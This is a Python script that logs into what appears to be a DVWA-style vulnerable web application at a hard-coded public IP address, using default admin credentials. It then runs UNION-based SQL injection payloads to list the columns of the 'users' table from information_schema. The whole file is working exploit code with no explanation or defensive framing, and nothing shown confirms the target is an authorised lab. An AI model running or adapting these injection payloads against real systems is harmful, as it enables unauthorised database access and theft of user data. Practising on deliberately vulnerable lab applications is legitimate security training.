
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Enumerating columns from information_schema...\n")

# Try to get column names from information_schema
payload_str = "-1' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 10"
print(f"[*] Trying: {payload_str}\n")
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

# Extract the pre section
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    print(f"Result:\n{result_text}\n")

# Try simpler approach - just try to get all columns
print("\n[*] Trying to get all data with GROUP_CONCAT...\n")

payload_str = "-1' UNION SELECT GROUP_CONCAT(COLUMN_NAME), 'columns' FROM information_schema.COLUMNS WHERE TABLE_NAME='users'"
print(f"[*] Trying: {payload_str}\n")
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

# Extract the pre section
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    print(f"Result:\n{result_text}\n")

